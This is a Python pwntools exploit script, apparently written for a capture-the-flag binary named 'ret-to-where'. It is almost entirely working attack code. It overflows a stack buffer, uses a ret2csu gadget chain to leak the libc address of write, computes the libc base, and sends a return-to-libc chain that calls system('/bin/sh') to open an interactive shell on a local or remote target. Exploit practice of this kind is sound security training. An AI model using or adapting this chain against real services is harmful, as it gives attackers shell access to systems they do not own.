#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("ret-to-where")
libc = ELF("./libc.so.6")
# Defining the GDB script that will be used when running the binary with the GDB parameter
gs = '''
breakvra 0x0000000000400555
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        #return remote("45.33.88.161", 1027)
        return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

#=-=-=- USE BOF TO LEAK LIBC -=-=-=

pop_rsi_r15 = 0x00000000004005e1 
pop_rdi = 0x00000000004005e3
ret = 0x0000000000400416
# Set the first argument of the write function in register RSI
# as the address of the same write function to leak its address,
# set R15 to any value, then call write function and finally
# call main to use BOF again later
payload = [
    b"A"*88,
    p64(elf.sym.__libc_csu_init + 90),
    p64(0),
    p64(1),
    p64(elf.got.write),
    p64(1),
    p64(elf.got.write),
    p64(8),
    p64(elf.sym.__libc_csu_init + 64),
    p64(0)*7,
    p64(elf.sym.main)
    ]

payload = b''.join(payload)

io.sendlineafter(b":", payload)

io.recv()

leak_got_write_address = u64(io.recv(8))

print(hex(leak_got_write_address))
libc.address = leak_got_write_address - libc.sym.write
"""
rop = ROP(libc, base=libc.address)
rop.call(rop.ret[0])
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(flat({88:rop.chain()}))
"""

#print("[+] /bin/sh: ",hex(next(libc.search(b'/bin/sh'))))
#print("[+] system: ",hex(libc.symbols.system))
#print(hex())

libc_address = leak_got_write_address - 0x114870
"""
payload = b"".join(
    [
        b"A"*88,
        p64(pop_rdi),
        p64(next(libc.search(b'/bin/sh'))),
        p64(ret),
        p64(libc.symbols.system)
    ]
)
"""

payload = b"".join(
    [
        b"A"*88,
        p64(pop_rdi),
        p64(libc_address + 0x1d8678),
        p64(ret),
        p64(libc_address + 0x050d70)
    ]
)


io.sendline(payload)

io.interactive()
